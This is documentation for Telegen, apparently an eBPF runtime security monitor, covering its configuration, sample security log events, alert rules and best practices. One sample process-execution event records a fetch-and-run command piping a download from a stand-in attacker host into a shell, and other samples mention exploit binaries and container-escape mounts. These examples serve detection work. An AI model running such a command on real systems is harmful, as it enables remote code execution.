# Security Observability

Telegen provides runtime security monitoring using eBPF.

## Overview

Security observability captures:

- **Syscall auditing** - Privileged operations
- **File integrity monitoring** - Critical file changes
- **Container escape detection** - Breakout attempts
- **Process execution** - Command tracking
- **Network security** - Suspicious connections

All events are exported as OpenTelemetry logs with security-specific attributes.

---

## Security Events

| Event Type | Description | Severity |
|------------|-------------|----------|
| **Process Execution** | New process started | Info/Warning |
| **Privilege Escalation** | setuid/setgid calls | Warning/Critical |
| **File Modification** | Critical file changed | Warning |
| **Kernel Module** | Module load/unload | Critical |
| **Container Escape** | Namespace breakout | Critical |
| **Suspicious Syscall** | Unusual syscall patterns | Warning |

---

## Configuration

### Enable Security Monitoring

```yaml
agent:
  security:
    enabled: true
```

### Full Configuration

```yaml
agent:
  security:
    enabled: true
    
    # Syscall auditing
    syscall_audit:
      enabled: true
      syscalls:
        # Process execution
        - execve
        - execveat
        
        # Privilege changes
        - setuid
        - setgid
        - setreuid
        - setregid
        - setresuid
        - setresgid
        
        # Debugging/tracing
        - ptrace
        
        # Filesystem mounting
        - mount
        - umount
        - umount2
        
        # Kernel modules
        - init_module
        - finit_module
        - delete_module
        
        # Container escape vectors
        - open_by_handle_at
        - name_to_handle_at
        
        # Network
        - socket
        - connect
        - bind
    
    # File integrity monitoring
    file_integrity:
      enabled: true
      paths:
        # Authentication
        - /etc/passwd
        - /etc/shadow
        - /etc/group
        - /etc/gshadow
        - /etc/sudoers
        - /etc/sudoers.d
        
        # SSH
        - /etc/ssh/sshd_config
        - /root/.ssh
        - /home/*/.ssh
        
        # System configuration
        - /etc/hosts
        - /etc/resolv.conf
        - /etc/crontab
        - /etc/cron.d
        
        # Binaries
        - /usr/bin
        - /usr/sbin
        - /bin
        - /sbin
      
      recursive: true
      
      events:
        - create
        - modify
        - delete
        - chmod
        - chown
        - rename
    
    # Container escape detection
    container_escape:
      enabled: true
      
      # Monitor namespace operations
      namespaces: true
      
      # Monitor cgroup escapes
      cgroups: true
      
      # Monitor privileged operations in containers
      privileged_ops: true
```

---

## Syscall Auditing

### Process Execution Tracking

Every `execve`/`execveat` is captured:

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "severity": "INFO",
  "body": "Process executed: /bin/bash -c 'curl http://evil.com | sh'",
  "attributes": {
    "security.event_type": "process_exec",
    "security.severity": "info",
    "process.pid": 12345,
    "process.ppid": 12340,
    "process.executable.path": "/bin/bash",
    "process.command_line": "/bin/bash -c 'curl http://evil.com | sh'",
    "process.owner": "www-data",
    "process.cwd": "/var/www",
    "k8s.pod.name": "web-server-abc123"
  }
}
```

### Privilege Escalation Detection

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "severity": "WARNING",
  "body": "Privilege escalation: setuid(0) by pid 12345",
  "attributes": {
    "security.event_type": "privilege_escalation",
    "security.severity": "warning",
    "syscall.name": "setuid",
    "syscall.args": [0],
    "process.pid": 12345,
    "process.executable.path": "/tmp/exploit",
    "process.owner": "www-data",
    "process.owner.uid": 33,
    "process.target.uid": 0
  }
}
```

### Kernel Module Operations

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "severity": "CRITICAL",
  "body": "Kernel module loaded: suspicious.ko",
  "attributes": {
    "security.event_type": "kernel_module",
    "security.severity": "critical",
    "syscall.name": "finit_module",
    "module.name": "suspicious",
    "module.path": "/tmp/suspicious.ko",
    "process.pid": 12345,
    "process.executable.path": "/bin/insmod"
  }
}
```

---

## File Integrity Monitoring

### Critical File Changes

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "severity": "WARNING",
  "body": "Critical file modified: /etc/passwd",
  "attributes": {
    "security.event_type": "file_integrity",
    "security.severity": "warning",
    "file.path": "/etc/passwd",
    "file.event": "modify",
    "file.owner": "root",
    "file.permissions": "0644",
    "process.pid": 12345,
    "process.executable.path": "/usr/sbin/useradd",
    "process.owner": "root"
  }
}
```

### SSH Key Changes

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "severity": "WARNING",
  "body": "SSH authorized_keys modified: /root/.ssh/authorized_keys",
  "attributes": {
    "security.event_type": "file_integrity",
    "security.severity": "warning",
    "file.path": "/root/.ssh/authorized_keys",
    "file.event": "modify",
    "process.pid": 12345,
    "process.executable.path": "/bin/bash"
  }
}
```

---

## Container Escape Detection

### Namespace Escape Attempts

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "severity": "CRITICAL",
  "body": "Container escape attempt: setns to host namespace",
  "attributes": {
    "security.event_type": "container_escape",
    "security.severity": "critical",
    "escape.type": "namespace",
    "escape.namespace": "mnt",
    "container.id": "abc123def456",
    "container.name": "suspicious-container",
    "k8s.pod.name": "attacker-pod",
    "process.pid": 12345
  }
}
```

### Privileged Container Operations

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "severity": "WARNING",
  "body": "Privileged operation in container: mount",
  "attributes": {
    "security.event_type": "privileged_operation",
    "security.severity": "warning",
    "syscall.name": "mount",
    "mount.source": "/dev/sda1",
    "mount.target": "/mnt/escape",
    "container.id": "abc123def456",
    "container.privileged": true
  }
}
```

---

## Event Correlation

Security events are correlated with other telemetry:

```{mermaid}
flowchart LR
    subgraph Timeline["Attack Timeline"]
        E1["HTTP Request\n(trace)"]
        E2["RCE Exploit\n(trace + log)"]
        E3["Process Exec\n(security)"]
        E4["Privilege Escalation\n(security)"]
        E5["Data Exfil\n(network)"]
    end
    
    E1 --> E2 --> E3 --> E4 --> E5
```

### Trace Context

Security events include trace context when available:

```json
{
  "attributes": {
    "trace_id": "a1b2c3d4e5f6789012345678",
    "span_id": "abc123def456",
    "security.event_type": "process_exec"
  }
}
```

---

## Alerting Integration

### Prometheus Metrics

Security events are also exposed as metrics:

```promql
# Total security events by type
telegen_security_events_total{event_type="process_exec", severity="warning"}

# File integrity violations
telegen_file_integrity_violations_total{path="/etc/passwd"}

# Container escape attempts
telegen_container_escape_attempts_total{escape_type="namespace"}
```

### Example Alert Rules

```yaml
groups:
  - name: security
    rules:
      - alert: PrivilegeEscalation
        expr: increase(telegen_security_events_total{event_type="privilege_escalation"}[5m]) > 0
        for: 0m
        labels:
          severity: critical
        annotations:
          summary: "Privilege escalation detected"
          
      - alert: ContainerEscape
        expr: increase(telegen_container_escape_attempts_total[5m]) > 0
        for: 0m
        labels:
          severity: critical
        annotations:
          summary: "Container escape attempt detected"
          
      - alert: CriticalFileModified
        expr: increase(telegen_file_integrity_violations_total{path=~"/etc/passwd|/etc/shadow"}[5m]) > 0
        for: 0m
        labels:
          severity: warning
        annotations:
          summary: "Critical system file modified"
```

---

## Best Practices

### 1. Focus on High-Value Syscalls

Don't trace everything—focus on security-relevant syscalls:

```yaml
agent:
  security:
    syscall_audit:
      syscalls:
        # Start with these critical syscalls
        - execve
        - setuid
        - ptrace
        - init_module
        - mount
```

### 2. Monitor Critical Paths Only

File integrity monitoring on large directories is expensive:

```yaml
agent:
  security:
    file_integrity:
      paths:
        # Good: Specific critical files
        - /etc/passwd
        - /etc/shadow
        - /etc/sudoers
        
        # Avoid: Large directories
        # - /home  # Too broad
        # - /var   # Too noisy
```

### 3. Tune for Your Environment

Reduce noise by excluding known-good patterns:

```yaml
agent:
  security:
    syscall_audit:
      exclude:
        # Exclude package manager updates
        - executable: "/usr/bin/apt*"
          syscall: execve
        
        # Exclude container runtime
        - executable: "/usr/bin/containerd*"
          syscall: mount
```

---

## Compliance Considerations

Telegen security monitoring supports:

| Framework | Relevant Controls |
|-----------|------------------|
| **PCI DSS** | File integrity (10.5.5), audit trails (10.2) |
| **SOC 2** | Change management, security events |
| **HIPAA** | Audit controls, access logs |
| **CIS Benchmarks** | Process execution, privilege use |

---

## Next Steps

- {doc}`network-observability` - Network security monitoring
- {doc}`../configuration/agent-mode` - Security configuration
- {doc}`../operations/troubleshooting` - Security event debugging
